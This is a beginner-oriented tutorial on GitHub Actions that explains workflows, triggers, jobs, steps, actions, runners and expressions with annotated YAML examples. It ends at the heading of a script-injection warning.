<div class="guide-stat-strip">
  <div class="guide-stat"><b>28</b><span>sections, zero experience to production</span></div>
  <div class="guide-stat"><b>60+</b><span>copy-paste workflow examples</span></div>
  <div class="guide-stat"><b>20,000+</b><span>ready-made Marketplace actions</span></div>
  <div class="guide-stat"><b>Free</b><span>unlimited minutes on public repos</span></div>
</div>

## 01 Introduction to GitHub Actions

GitHub Actions is GitHub's **built-in CI/CD and automation platform**. Instead of installing and maintaining a separate automation server such as Jenkins or CircleCI, you add a small instruction file to your repository and GitHub runs it for you, on GitHub's own machines, whenever something happens: a push, a pull request, a new release, a comment, or a fixed daily schedule.

Think of it as a tireless assistant for your project. Every time you save new code, it downloads the code, checks it, tests it, packages it, and can publish it — the same way every single time, without ever getting bored or making a typo.

### New to CI/CD

Two terms appear constantly in this guide:

- **Continuous Integration (CI)** — every change you push is automatically built and tested. If something breaks you find out within minutes instead of weeks, which keeps the main branch healthy at all times.
- **Continuous Deployment / Delivery (CD)** — once changes pass all checks they are automatically packaged and shipped: deployed to a server, published to npm or PyPI, built into a container image. No manual "build and upload" sessions.

GitHub Actions is one tool that provides CI/CD, with the advantage that it lives exactly where your code already does.

<div class="callout note">
  <span class="ct">Where do workflows live?</span>
  Every workflow file must be placed in <code>.github/workflows/</code> at the root of your repository, for example <code>.github/workflows/ci.yml</code>. Any file in that folder with a <code>.yml</code> or <code>.yaml</code> extension becomes an active workflow.
</div>

### What you need before you start

- A **free GitHub account**. That is genuinely all the tooling required; the tutorial in the next section runs entirely in your browser.
- **Basic Git**: how to make a commit and push it. Editing files directly on github.com works too.
- **A repository** in any language, of any size. A brand-new empty repository is a perfect playground.
- **No credit card.** Public repositories run workflows for free with unlimited minutes; private repositories get a free monthly allowance.

### The seven words you will see everywhere

These terms repeat through the whole guide. Skim them now and revisit anytime — each one gets a full section of its own.

| Term | Plain-English meaning |
|---|---|
| **Workflow** | The complete recipe: one YAML file in `.github/workflows/` describing everything that should happen |
| **Event** | The doorbell that starts the recipe: a push, a pull request, a schedule, a manual click |
| **Job** | A named group of work that runs on one machine, for example "build", "test", "deploy" |
| **Step** | A single task inside a job: one shell command or one ready-made building block |
| **Action** | A reusable step that someone already wrote and published |
| **Runner** | The virtual machine GitHub starts up to do the actual work |
| **YAML** | The simple text format workflow files are written in, introduced gently in the next section |

### How to use this guide

- **First time?** Read top to bottom. Sections build on each other, and the hands-on tutorial comes right after this introduction.
- **Every code block has a Copy button.** Take examples into your own repository and experiment; breaking things in a playground repository costs nothing.
- **In a hurry?** Jump to the complete examples or the cheat sheet at the end.
- **Stuck on an error?** Section 27 covers the mistakes everyone hits.

### What you can build with it

<div class="cards">
  <div class="card"><div class="icon">🧪</div><h4>Continuous Integration</h4><p>Run tests, linters, and type checks on every push and pull request automatically.</p></div>
  <div class="card"><div class="icon">🚀</div><h4>Continuous Deployment</h4><p>Deploy to AWS, Azure, Vercel, Kubernetes, npm, or a container registry on merge or tag.</p></div>
  <div class="card"><div class="icon">📅</div><h4>Scheduled tasks</h4><p>Cron-style jobs for nightly builds, dependency updates, backups, and cleanups.</p></div>
  <div class="card"><div class="icon">🏷️</div><h4>Release automation</h4><p>Generate release notes, build binaries, and publish packages when you tag a version.</p></div>
  <div class="card"><div class="icon">🤖</div><h4>Repository automation</h4><p>Label issues, greet contributors, close stale threads, assign reviewers.</p></div>
  <div class="card"><div class="icon">🔒</div><h4>Security scanning</h4><p>Run CodeQL, dependency audits, and secret scanning on every change.</p></div>
  <div class="card"><div class="icon">📊</div><h4>Data and model pipelines</h4><p>Retrain on a schedule, validate datasets, and publish model artifacts (section 23).</p></div>
  <div class="card"><div class="icon">📦</div><h4>Container builds</h4><p>Build, scan, tag, and push images to GHCR or Docker Hub with layer caching (section 21).</p></div>
</div>

### Expected result or use case

By the end of this guide you can read any workflow file in any repository, write your own CI pipeline from scratch, and debug a red run without guessing.

## 02 Your First Workflow

Reading about automation is one thing; watching a machine run your instructions is another. This five-minute tutorial takes you from zero to your first green check mark using **only your browser**.

### A one-minute YAML primer

Workflow files are written in **YAML**, a human-friendly text format. Four rules cover almost everything a beginner needs:

| Rule | Looks like | Meaning |
|---|---|---|
| Settings are key/value pairs | `name: CI` | A setting called `name` with the value `CI` |
| Indentation of two spaces shows nesting | `jobs:` then `  build:` | `build` belongs to `jobs`. **Never use Tab**, only spaces |
| Lines starting with a dash form a list | `- name: Checkout` | One item in a list, here a list of steps |
| A hash starts a comment | `# run tests` | Ignored by the machine, notes for humans |

### Practical example

<ol class="guide-steps">
  <li><b>Create a repository</b>Open <code>github.com/new</code> and create a public repository called <code>actions-playground</code>. Public repositories get unlimited free workflow minutes, so a playground costs nothing forever. An existing repository works just as well.</li>
  <li><b>Create the workflow file</b>Click <strong>Add file → Create new file</strong> and type the full path <code>.github/workflows/first.yml</code>. As you type the slashes GitHub turns each part into a folder. The leading dot in <code>.github</code> is intentional.</li>
  <li><b>Paste the workflow</b>Copy the file below into the editor exactly as it is.</li>
  <li><b>Commit it</b>Scroll down and click <strong>Commit new file</strong>. The workflow is now live, and committing it <em>is itself a push event</em>, so it triggers immediately.</li>
  <li><b>Watch it run</b>Open the <strong>Actions</strong> tab, click the run, click the <code>hello</code> job, then expand each step to see its output. A yellow dot means running, a green check means success, a red cross means failure.</li>
</ol>

```yaml .github/workflows/first.yml
name: My First Workflow

on: push                    # the doorbell: run on every push

jobs:
  hello:                    # you choose this name
    runs-on: ubuntu-latest  # ask GitHub for a free Linux machine
    steps:
      - name: Say hello
        run: echo "Hello, GitHub Actions!"

      - name: Show run info
        run: |
          echo "Operating system : ${{ runner.os }}"
          echo "Repository       : ${{ github.repository }}"
          echo "Triggered by     : ${{ github.actor }}"
```

### What just happened

<div class="guide-timeline">
  <div class="guide-timeline-item"><span>0s</span><strong>Push event fired</strong><small>Your commit created a <code>push</code> event on the repository.</small></div>
  <div class="guide-timeline-item"><span>1s</span><strong>Workflow matched</strong><small>GitHub read every file in <code>.github/workflows/</code> and found one whose <code>on:</code> trigger matched.</small></div>
  <div class="guide-timeline-item"><span>5s</span><strong>Runner provisioned</strong><small>A brand-new Ubuntu virtual machine booted and cloned nothing yet — only what your steps ask for.</small></div>
  <div class="guide-timeline-item"><span>8s</span><strong>Steps executed in order</strong><small>Expressions such as <code>runner.os</code> were replaced with real values before each command ran.</small></div>
  <div class="guide-timeline-item"><span>12s</span><strong>Runner destroyed</strong><small>The machine was thrown away. Every future push repeats the recipe on a fresh machine.</small></div>
</div>

<div class="callout tip">
  <span class="ct">Exercises, five minutes each</span>
  ① Add a third step <code>- run: date</code>, commit, and find its output. ② Change <code>on: push</code> to <code>on: workflow_dispatch</code> — now it runs only when you click "Run workflow" in the Actions tab. ③ Break it on purpose with <code>- run: exit 1</code>, watch the red cross, open the log, then fix it. Reading failure logs calmly is the single most useful practical Actions skill.
</div>

### Expected result or use case

You have a live workflow, a green run, and the muscle memory for the edit-commit-watch loop that the rest of this guide relies on.

## 03 Anatomy of a Workflow

Everything in GitHub Actions is built from six building blocks. Understanding how they nest is most of learning the platform.

<div class="flow">
  <div class="node">EVENT<small>push / PR / schedule</small></div>
  <span class="arrow">→</span>
  <div class="node">WORKFLOW<small>.github/workflows/*.yml</small></div>
  <span class="arrow">→</span>
  <div class="node">JOB<small>runs on a runner VM</small></div>
  <span class="arrow">→</span>
  <div class="node">STEP<small>action or shell command</small></div>
  <span class="arrow">→</span>
  <div class="node">RUNNER<small>the machine executing it</small></div>
</div>

An event triggers a workflow. A workflow contains one or more jobs. Each job runs on a fresh runner and is made of steps. Each step is either a shell script or a pre-built action.

### The six building blocks in plain English

| Term | What it really is | Analogy |
|---|---|---|
| **Event** | Something that happened in or around your repository | The doorbell ringing |
| **Workflow** | The YAML file describing what to do | The full recipe |
| **Job** | A group of steps running on one machine | One chapter of the recipe |
| **Step** | A single command or action | A single instruction: "crack two eggs" |
| **Action** | A reusable step someone already wrote | A pre-mixed spice blend |
| **Runner** | The fresh virtual machine doing the work | The kitchen |

### Practical example

```yaml .github/workflows/anatomy.yml — every keyword annotated
# ┌────────────────────────────────────────────────────────
# │ 1. WORKFLOW — the whole file is one workflow
# └────────────────────────────────────────────────────────
name: Learn GitHub Actions          # display name in the Actions tab

run-name: Deploy by @${{ github.actor }}   # dynamic run title (optional)

on: push                            # 2. EVENT — what triggers this

permissions:
  contents: read                    # least-privilege token (optional)

env:
  PROJECT: demo                     # workflow-wide env vars (optional)

defaults:
  run:
    shell: bash                     # default shell for `run` steps

jobs:                               # 3. JOBS — groups of steps
  build:                            # job id (you choose the name)
    name: Build and Test            # display name
    runs-on: ubuntu-latest          # 6. RUNNER — the VM to use
    timeout-minutes: 10             # kill the job after 10 min (safety)

    steps:                          # 4. STEPS — sequential tasks
      - name: Checkout code         # step 1: uses an ACTION
        uses: actions/checkout@v4   # 5. ACTION — reusable unit

      - name: Setup Node
        uses: actions/setup-node@v4
        with:                       # inputs to the action
          node-version: '20'
          cache: npm

      - name: Install and test      # step 3: raw shell command
        run: |
          npm ci
          npm test

      - name: Share build output    # step 4: save an ARTIFACT
        uses: actions/upload-artifact@v4
        with:
          name: dist
          path: dist/
```

### How to read that file

- **Top to bottom:** display name, then trigger, then global settings (`permissions`, `env`, `defaults`), then `jobs:`.
- **Under `jobs:`**, `build:` is a job *id* you invent. Its display name, runner, and steps are indented beneath it.
- **Under `steps:`**, the dash lines run *in order, on the same machine*, so files created by step one exist in step two.
- **`${{ ... }}`** marks spots where GitHub injects real values at run time.
- Everything marked optional can be deleted. A minimal workflow needs only `on:`, one job, `runs-on:`, and `steps:`.

<div class="callout tip">
  <span class="ct">Pro tip</span>
  Open the <strong>Actions</strong> tab and click <strong>New workflow</strong> in any repository to browse dozens of ready-made starter templates matched to your language and platform.
</div>

### Expected result or use case

You can now open an unfamiliar workflow file and immediately identify its trigger, its jobs, its dependency order, and which steps are actions versus shell commands.

## 04 Workflows

A **workflow** is a configurable automated process defined in a YAML file: the complete recipe from the previous section. In practice, **one YAML file equals one workflow**. A repository can contain as many as you like, each independent — `ci.yml` for tests, `deploy.yml` for releases, `codeql.yml` for security scanning. GitHub decides which ones to run by reading each file's `on:` trigger.

Beginners usually start with a single `ci.yml` and split out more workflows as the project grows. Rule of thumb: group by *purpose and trigger*. Tests run on every push, deploys only on the main branch, releases only on tags.

### Workflow-level keywords

| Keyword | Required | Purpose |
|---|---|---|
| `name` | <span class="pill opt">optional</span> | Display name in the Actions tab |
| `run-name` | <span class="pill opt">optional</span> | Dynamic name per run, supports expressions |
| `on` | <span class="pill req">required</span> | Event or events that trigger the workflow |
| `permissions` | <span class="pill opt">optional</span> | Restrict the `GITHUB_TOKEN` access scopes |
| `env` | <span class="pill opt">optional</span> | Variables available to all jobs and steps |
| `concurrency` | <span class="pill opt">optional</span> | Cancel outdated in-progress runs of the same group |
| `defaults` | <span class="pill opt">optional</span> | Default shell and working directory for run steps |
| `jobs` | <span class="pill req">required</span> | The map of jobs to execute |

### Practical example

```yaml .github/workflows/ci.yml
name: CI                              # shown in the Actions tab
                                      # (optional, defaults to the file name)

on: push                              # single event

# ── multiple events ─────────────────────────────────────
# on: [push, pull_request, workflow_dispatch]

# ── event with filters (activity types / branch filters) ─
# on:
#   push:
#     branches: [main, 'release/**']  # only these branches
#     paths-ignore: ['docs/**']       # skip doc-only changes
#   pull_request:
#     types: [opened, synchronize, reopened]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "Workflow triggered by ${{ github.event_name }}"
```

### Naming and organising files

| File | Trigger | Responsibility |
|---|---|---|
| `ci.yml` | `push`, `pull_request` | Lint, type-check, unit tests. Must stay fast |
| `deploy.yml` | `push` to `main` | Build and deploy the application |
| `release.yml` | `push` of `v*` tags | Build artifacts and publish a GitHub Release |
| `nightly.yml` | `schedule` | Slow suites, integration tests, dependency audits |
| `codeql.yml` | `push`, `schedule` | Security analysis |

### Expected result or use case

Splitting one large workflow into purpose-scoped files means a failed nightly integration run never blocks a pull request, and each file stays short enough to read in one screen.

## 05 Events and Triggers

Events are the things that happen in or around your repository that can start a workflow. The `on:` block answers the question *"when should this run?"*. GitHub offers more than thirty events, and each can be filtered so you react only to what matters: certain branches, certain file paths, certain tags, or certain activity types such as "pull request opened" but not "pull request closed".

### Most-used events reference

| Event | Triggers when | Typical use |
|---|---|---|
| `push` | Commits are pushed to a branch or tag | CI on main, deploys |
| `pull_request` | A PR is opened, updated, or closed | Test PRs before merge |
| `pull_request_target` | Like above but runs in base-repo context with secrets | Label or comment on fork PRs |
| `workflow_dispatch` | Manually from the Actions tab | On-demand runs with inputs |
| `schedule` | A cron schedule in UTC | Nightly builds, cleanups |
| `release` | A release is published or created | Upload assets, publish packages |
| `issues` | An issue is opened, labeled, closed | Auto-triage, greetings |
| `issue_comment` | A comment is added to an issue or PR | Slash commands |
| `workflow_call` | Another workflow calls this one | Reusable workflows |
| `workflow_run` | Another workflow finished | Post-processing, gated deploys |
| `repository_dispatch` | An external system calls the REST API | Trigger from other tools |
| `merge_group` | A PR enters the merge queue | Required checks for merge queues |
| `deployment_status` | A deployment changes state | Smoke tests after deploy |

### Practical example

```yaml .github/workflows/triggers.yml
name: Trigger Examples

on:
  # ① push filtered by branch and path
  push:
    branches: [main, 'feat/**']        # globs supported
    tags: ['v*.*.*']                   # and version tags
    paths:
      - 'src/**'
      - '!src/**/*.md'                 # exclude markdown

  # ② pull requests, filtered by activity type
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened, ready_for_review]

  # ③ cron: "every day at 03:15 UTC" (min hour dom mon dow)
  schedule:
    - cron: '15 3 * * *'

  # ④ manual: a button in the Actions tab with an input form
  workflow_dispatch:
    inputs:
      environment:
        description: 'Deploy target'
        type: choice
        options: [staging, production]
        default: staging
      dry_run:
        description: 'Skip the actual deploy?'
        type: boolean
        default: false

jobs:
  show:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "event    = ${{ github.event_name }}"
          echo "ref      = ${{ github.ref }}"
          echo "target   = ${{ inputs.environment }}"
          echo "dry run? = ${{ inputs.dry_run }}"
```

<div class="callout warn">
  <span class="ct">One key per event</span>
  YAML maps cannot repeat a key. Writing <code>push:</code> twice — once for branches and once for tags — silently keeps only the last block. Put <code>branches</code>, <code>tags</code>, and <code>paths</code> inside a single <code>push:</code> entry, as shown above.
</div>

### Filtering rules that trip people up

| Filter | Behaviour |
|---|---|
| `branches` and `branches-ignore` | Mutually exclusive on the same event. Pick one |
| `paths` and `paths-ignore` | Also mutually exclusive. Use negation patterns inside `paths` when you need both |
| `tags` | When you specify `tags`, pushes to branches no longer trigger unless `branches` is also present |
| `types` | Defaults to `[opened, synchronize, reopened]` for `pull_request` |
| Path filters | Do not apply to `schedule`, `workflow_dispatch`, or `workflow_call` |

<div class="callout note">
  <span class="ct">Reading a cron expression</span>
  The five fields of <code>'15 3 * * *'</code> are, left to right: <strong>minute (0-59), hour (0-23), day of month (1-31), month (1-12), day of week (0-6, Sunday is 0)</strong>. So this one means "at 03:15 every day", and <code>*</code> means "every". Build expressions visually at <code>crontab.guru</code> and always keep the whole expression quoted as a string.
</div>

<div class="callout warn">
  <span class="ct">Schedule gotchas</span>
  Cron uses <strong>UTC</strong>, never your local timezone. The shortest interval is five minutes, scheduled runs are delayed during high-load periods (often by fifteen minutes or more), and schedules are disabled automatically after sixty days of repository inactivity. Add <code>workflow_dispatch</code> alongside every <code>schedule</code> so you always have a manual fallback.
</div>

### Expected result or use case

Precise triggers are the cheapest performance win available: adding `paths-ignore: ['docs/**', '**/*.md']` to a busy repository can remove a third of all runs without losing a single real check.

## 06 Jobs

A **job** is a set of steps executed on the same runner: one chapter of your recipe. Two facts are critical for beginners:

- **Jobs run in parallel by default**, each on its *own separate machine*. Add `needs:` to force an order such as "deploy only after tests pass". If a needed job fails, dependent jobs are skipped unless you opt out with a condition like `if: always()`.
- **Every job gets a brand-new VM.** Files created in one job are *not* visible in another. Moving files between jobs is exactly what artifacts (section 14) are for.

### Job-level keywords

| Keyword | What it does |
|---|---|
| `runs-on` | Runner image or label: `ubuntu-latest`, `windows-latest`, `macos-latest`, or a self-hosted label |
| `needs` | Jobs that must succeed first, which creates the dependency graph |
| `if` | Conditional execution with expressions |
| `env` | Job-scoped environment variables |
| `outputs` | Values exposed to jobs that declare `needs` on this one |
| `timeout-minutes` | Hard cap on job duration, default 360 |
| `strategy` | Matrix and fail-fast configuration (section 15) |
| `continue-on-error` | Let the workflow proceed even if this job fails |
| `container` | Run the whole job inside a Docker container |
| `services` | Sidecar containers such as databases and caches (section 16) |
| `environment` | Deployment environment plus protection rules (section 18) |
| `concurrency` | Serialize or cancel runs per group (section 19) |
| `permissions` | Job-scoped token scopes (section 20) |

### Practical example

```yaml .github/workflows/pipeline.yml — job dependency graph
name: Pipeline

on: push

jobs:
  lint:                                # ── runs first
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm run lint

  test:
    needs: lint                        # ── waits for lint
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false                 # do not cancel siblings on failure
    steps:
      - uses: actions/checkout@v4
      - run: npm test

  deploy:
    needs: [lint, test]                # ── waits for multiple jobs
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: production            # may require approval (section 18)
    steps:
      - run: echo "deploying..."

  notify-on-failure:                   # ── runs even if deploy failed
    needs: deploy
    if: always() && needs.deploy.result == 'failure'
    runs-on: ubuntu-latest
    steps:
      - run: echo "deploy failed, sending alert"
```

### Conditional jobs

```yaml conditional jobs — the if expression in action
jobs:
  build:
    runs-on: ubuntu-latest
    if: |
      github.event_name == 'push' ||
      github.event.pull_request.draft == false
    steps:
      - run: echo "runs on real pushes and non-draft PRs"

  deploy-preview:
    runs-on: ubuntu-latest
    # expressions do not need ${{ }} inside if:
    if: github.event_name == 'pull_request'
    steps:
      - run: echo "PR preview deploy"

  deploy-prod:
    runs-on: ubuntu-latest
    if: startsWith(github.ref, 'refs/tags/v')
    steps:
      - run: echo "tag-triggered production deploy"
```

### Job results you can branch on

`needs.<job_id>.result` is one of `success`, `failure`, `cancelled`, or `skipped`. Combine it with `always()` to build reliable cleanup and notification jobs:

| Condition | Runs when |
|---|---|
| `if: success()` | Default. All needed jobs succeeded |
| `if: failure()` | Any needed job failed |
| `if: cancelled()` | The run was cancelled |
| `if: always()` | Unconditionally, even after failure or cancellation |
| `if: always() && needs.build.result != 'skipped'` | Cleanup that only matters when build actually ran |

### Expected result or use case

A three-stage graph — parallel `lint` and `test`, then a gated `deploy`, then an `always()` notifier — gives fast feedback on pull requests and a single reliable place to report failures.

## 07 Steps

A **step** is an individual task: either a shell command (`run`) or a reusable action (`uses`). Steps in a job run sequentially in the same VM, so files created by one step are available to the next.

### The two kinds of steps

|  | `run:` your own command | `uses:` a ready-made action |
|---|---|---|
| What it does | Executes a shell command you write | Runs a reusable building block |
| Example | `run: npm test` | `uses: actions/checkout@v4` |
| Give it options via | `env:` | `with:` |
| Use it for | Your project's own commands: build, test, scripts | Common plumbing: check out code, install Node, upload files |

### Practical example

```yaml steps — run vs uses vs with
jobs:
  example:
    runs-on: ubuntu-latest
    steps:
      # ACTION step: checks out your repo into $GITHUB_WORKSPACE
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 0               # full history (default: 1 commit)

      # RUN step: plain shell, | for multi-line
      - name: Build
        run: |
          echo "Building on $(uname -a)"
          make build

      # per-step env plus working-directory
      - name: Test
        run: npm test
        working-directory: ./backend
        env:
          NODE_ENV: test

      # keep going even if this step fails
      - name: Optional lint
        run: npm run lint
        continue-on-error: true

      # capture a step OUTPUT for later steps
      - name: Get version
        id: ver
        run: echo "version=1.2.3" >> "$GITHUB_OUTPUT"

      # consume the output of a previous step
      - name: Use output
        run: echo "Version is ${{ steps.ver.outputs.version }}"
```

### Passing data between steps and jobs

```yaml step outputs and job outputs
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:                           # ← expose for OTHER jobs
      version: ${{ steps.meta.outputs.version }}
    steps:
      - id: meta
        run: echo "version=$(cat VERSION)" >> "$GITHUB_OUTPUT"

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying v$VERSION"
        env:
          VERSION: ${{ needs.build.outputs.version }}
```

### The four special files a step can write to

| File | Effect |
|---|---|
| `$GITHUB_OUTPUT` | `key=value` lines become `steps.<id>.outputs.key` |
| `$GITHUB_ENV` | `key=value` lines become environment variables for **later steps** |
| `$GITHUB_PATH` | One path per line, prepended to `PATH` for later steps |
| `$GITHUB_STEP_SUMMARY` | Markdown rendered on the run summary page (section 24) |

```bash writing to the step files
# a value later steps can read as an expression
echo "version=1.4.2" >> "$GITHUB_OUTPUT"

# a value later steps can read as a shell variable
echo "BUILD_ID=$(date +%s)" >> "$GITHUB_ENV"

# put a local tool on PATH for later steps
echo "$PWD/bin" >> "$GITHUB_PATH"

# multi-line values need a delimiter block
{
  echo "notes<<EOF"
  git log --oneline -10
  echo "EOF"
} >> "$GITHUB_OUTPUT"
```

<div class="callout tip">
  <span class="ct">GITHUB_OUTPUT, not set-output</span>
  The old <code>::set-output</code> workflow command is deprecated and now fails on current runners. Always write <code>key=value</code> lines to the <code>$GITHUB_OUTPUT</code> file, then read them via the <code>steps.&lt;id&gt;.outputs.key</code> expression.
</div>

### Expected result or use case

A step that computes a version once and writes it to `$GITHUB_OUTPUT` becomes the single source of truth for the image tag, the release title, and the deployment label in the rest of the pipeline.

## 08 Actions and the Marketplace

An **action** is a reusable unit of code: the building block you plug into a step with `uses`. Think of the GitHub Marketplace as an app store for automation, with more than twenty thousand ready-made actions for checking out code, installing tools, logging in to cloud providers, posting comments, and almost anything else.

Every reference has the shape `owner/repo@version`. In `actions/checkout@v4`, `actions` is the organisation that maintains it, `checkout` is the repository containing the action's code, and `@v4` pins the major version. Actions can also come from your own repository by path, or run from a Docker image.

### Referencing actions

```yaml action reference styles
steps:
  # ① public repo, tag pinned (convenient)
  - uses: actions/checkout@v4
  - uses: actions/setup-node@v4

  # ② SHA pinning, most secure and reproducible (supply-chain best practice)
  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

  # ③ same-repo action, a path to a directory containing action.yml
  - uses: ./.github/actions/my-custom-action

  # ④ an action from another repository you control
  - uses: my-org/my-shared-actions/lint@v1

  # ⑤ a published Docker image, no repository needed
  - uses: docker://alpine:3.20
```

### Essential official actions

| Action | What it does | Key inputs |
|---|---|---|
| `actions/checkout` | Clone your repository into the workspace | `ref`, `fetch-depth`, `submodules`, `token` |
| `actions/setup-node` | Install Node plus an optional npm cache | `node-version`, `cache`, `registry-url` |
| `actions/setup-python` | Install Python plus a pip cache | `python-version`, `cache` |
| `actions/setup-java` | Install a JDK plus a Maven or Gradle cache | `java-version`, `distribution`, `cache` |
| `actions/cache` | Generic cache save and restore (section 13) | `path`, `key`, `restore-keys` |
| `actions/upload-artifact` | Publish files from a run (section 14) | `name`, `path`, `retention-days` |
| `actions/download-artifact` | Pull files into another job | `name`, `path`, `pattern` |
| `actions/github-script` | Call the GitHub API with inline JavaScript | `script` |
| `actions/attest-build-provenance` | Sign artifacts with build provenance | `subject-path` |
| `github/codeql-action` | Static security analysis | `languages` |

### Practical example

```yaml github-script — call the REST API without curl
- name: Comment on the pull request
  uses: actions/github-script@v7
  with:
    script: |
      await github.rest.issues.createComment({
        owner: context.repo.owner,
        repo: context.repo.repo,
        issue_number: context.issue.number,
        body: 'Build passed. Artifacts are ready for review.'
      })
```

### Choosing a third-party action safely

<div class="guide-compare">
  <div class="guide-compare-col good">
    <h4>Trust signals</h4>
    <ul>
      <li>Maintained by <code>actions</code>, <code>github</code>, <code>docker</code>, or a vendor you already depend on</li>
      <li>Recent commits and released tags, not a single commit from years ago</li>
      <li>You can read the whole <code>action.yml</code> in a couple of minutes</li>
      <li>Pinned by SHA in your workflow, with the version in a trailing comment</li>
    </ul>
  </div>
  <div class="guide-compare-col bad">
    <h4>Warning signs</h4>
    <ul>
      <li>A bundled <code>dist/index.js</code> that does not match the source</li>
      <li>Requests broad secrets it does not need, such as a full-access token</li>
      <li>Referenced by a moving branch such as <code>@main</code> or <code>@master</code></li>
      <li>Does one <code>curl</code> you could write yourself in three lines</li>
    </ul>
  </div>
</div>

<div class="callout tip">
  <span class="ct">Keep actions updated automatically</span>
  Add a <code>.github/dependabot.yml</code> with <code>package-ecosystem: "github-actions"</code>. Dependabot then opens pull requests when a pinned action publishes a new release, which is what makes SHA pinning practical rather than a maintenance burden.
</div>

### Expected result or use case

Ninety percent of real workflows are four or five official actions plus your own `run` steps. Reach for the Marketplace only when the plumbing is genuinely non-trivial.

## 09 Runners

A **runner** is the machine that executes your jobs: the kitchen where your recipe is cooked. GitHub provides ready-to-use virtual machines for Linux, Windows, and macOS with popular tools preinstalled, and you pick one with `runs-on:`. Alternatively you can connect your own machines as self-hosted runners for special hardware or private network access.

<div class="callout note">
  <span class="ct">Fresh machine every time, the biggest beginner surprise</span>
  Each job runs on a <strong>brand-new VM that is destroyed when the job ends</strong>. Nothing persists between runs: no installed software, no downloaded dependencies, no leftover files. This is deliberate, because it makes builds reproducible. Caching (section 13) and artifacts (section 14) exist to soften the cost.
</div>

### GitHub-hosted runners

| Label | OS | Specs | Preinstalled |
|---|---|---|---|
| `ubuntu-latest` | Ubuntu 24.04 | 4 vCPU, 16 GB RAM, 14 GB SSD | Docker, Node, Python, Java, Go, gcloud, AWS CLI |
| `windows-latest` | Windows Server 2022 | 4 vCPU, 16 GB RAM | Visual Studio, Node, Python, Chocolatey |
| `macos-latest` | macOS 14 on Arm | 3 vCPU, 7 GB RAM | Xcode, Node, Python, Homebrew |
| `ubuntu-24.04-arm` | Ubuntu Arm64 | 4 vCPU, 16 GB RAM | Same toolset on Arm |

Billing: public repositories get unlimited free minutes. Private repositories get a monthly quota (2,000 minutes on the Free plan), and macOS runs at a ten times multiplier while Windows runs at two times. Always pin the OS version (`ubuntu-24.04` rather than `ubuntu-latest`) in workflows that must not change behaviour when GitHub rolls the `latest` alias forward.

### Self-hosted runners

```yaml targeting self-hosted runners by label
jobs:
  gpu-tests:
    runs-on: [self-hosted, linux, x64, gpu]   # ALL labels must match
    steps:
      - uses: actions/checkout@v4
      - run: ./run-gpu-benchmarks.sh

  windows-on-prem:
    runs-on: [self-hosted, Windows, X64]
    steps:
      - run: echo "Running on our own datacenter machine"
```

<div class="callout warn">
  <span class="ct">Self-hosted security</span>
  Never attach self-hosted runners to public repositories that run <code>pull_request</code> workflows. A forked pull request could execute arbitrary code on your machine, and unlike a hosted runner the machine is not destroyed afterwards. Use GitHub-hosted runners for untrusted code, and keep self-hosted runners for private repositories and ephemeral (single-job) configurations.
</div>

### Job containers

```yaml container job — a pinned toolchain everywhere
jobs:
  test-in-container:
    runs-on: ubuntu-latest
    container:
      image: node:20-bookworm           # everything runs inside this
      env:
        NODE_ENV: ci
      options: --cpus 2                 # docker create options
      volumes:
        - /data/cache:/cache
    steps:
      - uses: actions/checkout@v4       # checkout works inside too
      - run: node --version             # → v20.x
```

### Expected result or use case

Use hosted runners by default. Reach for a container job when the toolchain must match production exactly, and for self-hosted runners only when you need GPUs, licensed software, or access to a private network.

## 10 Contexts and Expressions

**Contexts** are objects that expose data about the current run: who triggered it, which branch, which commit, which OS. **Expressions**, written `${{ ... }}`, are the syntax for reading that data and applying logic to it. For example `${{ github.actor }}` literally becomes `alice` in the final command if alice triggered the run.

### Context reference

| Context | Contains | Example |
|---|---|---|
| `github` | Event payload, repository, ref, sha, actor | `github.sha` |
| `env` | Variables set via `env:` | `env.NODE_ENV` |
| `job` | Status information for the current job | `job.status` |
| `steps` | Outputs of earlier steps, keyed by `id` | `steps.build.outputs.bin` |
| `runner` | Runner machine information | `runner.os`, `runner.arch` |
| `secrets` | Repository, organisation, and environment secrets | `secrets.DEPLOY_KEY` |
| `vars` | Repository and organisation variables | `vars.REGION` |
| `needs` | Outputs and results of needed jobs | `needs.build.outputs.v` |
| `matrix` | The current matrix combination | `matrix.node` |
| `inputs` | `workflow_dispatch` and `workflow_call` inputs | `inputs.env` |
| `github.event` | The full webhook payload of the trigger | `github.event.pull_request.number` |

### Operators and functions

```text expression cookbook
# ── operators ────────────────────────────────────────────
${{ a == b }}   ${{ a != b }}   ${{ a && b }}   ${{ a || b }}
${{ a > b }}    ${{ contains('hello', 'ell') }}     # → true
${{ startsWith('v1.2', 'v') }}                      # → true
${{ endsWith('file.yml', '.yml') }}                 # → true
${{ contains(github.event.pull_request.labels.*.name, 'deploy') }}

# ── formatting and json ─────────────────────────────────
${{ format('Hello {0}, you are #{1}', github.actor, 42) }}
${{ toJSON(github.event) }}                         # object → JSON string
${{ fromJSON('{"a":1}') }}                          # JSON string → object
${{ fromJSON(steps.plan.outputs.directories) }}     # typical usage

# ── ternary via short-circuit (there is no ?: operator) ─
environment: ${{ github.ref == 'refs/heads/main' && 'production' || 'staging' }}

# ── defaulting and hashing ──────────────────────────────
${{ inputs.logLevel || 'info' }}                    # fallback value
${{ hashFiles('**/package-lock.json') }}            # stable cache key
```

### Status check functions

```yaml always() / failure() / success() / cancelled()
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: exit 1

  cleanup:
    needs: build
    if: always()                      # run no matter what happened
    runs-on: ubuntu-latest
    steps:
      - run: ./teardown.sh

  report-failure:
    needs: build
    if: failure()                     # only when a needed job failed
    runs-on: ubuntu-latest
    steps:
      - run: curl -X POST "$SLACK_WEBHOOK" -d '{"text":"build broke"}'
        env:
          SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK }}
```

<div class="callout warn">
  <span class="ct">Script injection: the most common Actions vulnerability</span>
